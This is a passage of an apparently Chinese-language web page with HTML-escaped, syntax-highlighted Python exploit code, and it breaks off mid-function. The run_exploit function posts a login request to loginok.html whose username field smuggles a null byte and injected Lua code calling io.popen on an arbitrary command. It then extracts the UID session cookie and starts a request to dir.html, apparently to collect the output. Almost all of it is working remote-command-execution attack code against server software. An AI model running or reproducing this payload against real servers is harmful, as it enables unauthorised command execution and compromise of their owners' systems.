&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;GREEN&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RESET&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;print_red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RED&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RESET&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;run_exploit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;anonymous&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;login_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/loginok.html&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;login_headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;//&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Language&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;en-US,en;q=0.5&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept-Encoding&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;gzip, deflate, br&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;application/x-www-form-urlencoded&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Origin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Connection&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;keep-alive&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Referer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/login.html?lang=english&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;client_lang=english&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Priority&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;u=0, i&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;urllib.parse&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;encoded_username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;quote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;username=&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encoded_username&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;%00]]%0dlocal+h+%3d+io.popen(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)%0dlocal+r+%3d+h%3aread(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;*a&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%0d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%3a&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;close()&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%0d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;print(r)&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%0d&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;--&amp;amp;password=&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] 向 &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;login_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 发送POST请求，命令: &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;，用户名: &amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;login_response&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;login_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;login_headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;login_response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;raise_for_status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;except&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exceptions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;RequestException&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] 发送POST请求到 &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;login_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 错误: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;set_cookie&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login_response&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;headers&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Set-Cookie&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;match&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;re&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;UID=([^;]+)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;set_cookie&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_red&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[-] 在Set-Cookie中未找到UID，漏洞利用可能失败或响应格式已改变&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;match&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;verbose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;print_green&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+] 提取的UID: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;dir_url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;target_url&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/dir.html&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;dir_headers&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login_headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Host&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login_headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;login_headers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
